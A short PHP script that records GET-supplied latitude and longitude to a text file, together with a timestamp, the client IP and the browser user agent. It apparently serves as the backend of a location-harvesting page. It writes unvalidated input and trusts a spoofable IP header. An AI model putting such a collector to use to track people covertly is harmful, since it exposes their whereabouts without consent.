<?php
$locations_file = 'locations.txt';

if (!file_exists($locations_file)) {
    $create = @fopen($locations_file, 'w');
    if ($create) fclose($create);
    else {
        http_response_code(500);
        exit("Error: Cannot create locations.txt. Check permissions.");
    }
}

$latitude  = $_GET['lat']  ?? null;
$longitude = $_GET['long'] ?? null;

if ($latitude !== null && $longitude !== null) {

    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']
        ?? $_SERVER['HTTP_CLIENT_IP']
        ?? $_SERVER['REMOTE_ADDR'];

    $browser = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

    $entry = date('Y-m-d H:i:s')
        ." | Latitude: $latitude, \n Longitude: $longitude"
        ." | IP: $ip | Browser: $browser\n";

    file_put_contents($locations_file, $entry, FILE_APPEND | LOCK_EX);

    echo "Location saved.";
} else {
    echo "Invalid coordinates.";
}
